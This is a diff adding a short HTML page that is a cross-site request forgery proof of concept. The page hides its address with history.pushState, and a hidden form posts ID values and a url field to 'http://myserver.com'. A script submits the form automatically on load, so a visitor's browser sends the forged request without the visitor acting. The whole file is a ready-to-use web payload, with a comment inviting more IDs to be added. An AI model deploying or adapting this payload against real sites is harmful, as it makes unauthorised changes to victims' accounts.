@@ -1,0 +1,15 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://myserver.com" method="POST">
+      <input type="hidden" name="Id[]" value="83" />
+      <input type="hidden" name="Id[]" value="85" />
+      <!-- you can add as many as input here for id if you want -->
+      <input type="hidden" name="url" value="http://example.com/" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
